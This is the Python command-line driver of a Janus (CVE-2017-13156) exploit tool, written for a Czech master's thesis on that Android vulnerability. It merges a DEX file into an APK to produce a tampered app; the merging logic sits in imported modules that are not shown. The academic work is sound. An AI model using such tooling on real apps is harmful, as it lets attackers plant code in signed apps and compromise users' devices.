# Tento kód je součást diplomové práce "Využití zranitelnosti Janus na operačním systému Android"
# Autor: Bc. Vít Souček (soucevi1@fit.cvut.cz)
#
# Použité zdroje:
#     - Proof-of-concept využití zranitelnosti Janus:
#         autor: V-E-O
#         dostupné z: https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156
#         Převzata hlavni myšlenka a postup tohoto zdroje. Zdroj není citován na konkrétních místech v kódu,
#         neboť téměř celý kód byl pro potřeby této práce upraven a přepsán


import click
from .apk import Apk
from .dex import Dex
from .janus import Janus


@click.command()
@click.argument('in_dex', required=True, type=click.File('rb'))
@click.argument('in_apk', required=True, type=click.File('rb'))
@click.argument('out_apk', required=True, type=click.File('wb'))
def main(in_dex, in_apk, out_apk):
    print(f'Merging files {in_dex.name} and {in_apk.name}, result will be written to {out_apk.name}')

    dex_file = Dex(bytearray(in_dex.read()))
    apk_file = Apk(bytearray(in_apk.read()))

    merger = Janus(apk_file, dex_file)
    merger.update_offsets()
    out_data = merger.join_the_files()

    out_apk.write(out_data)

    print(f'{out_apk.name} generated')
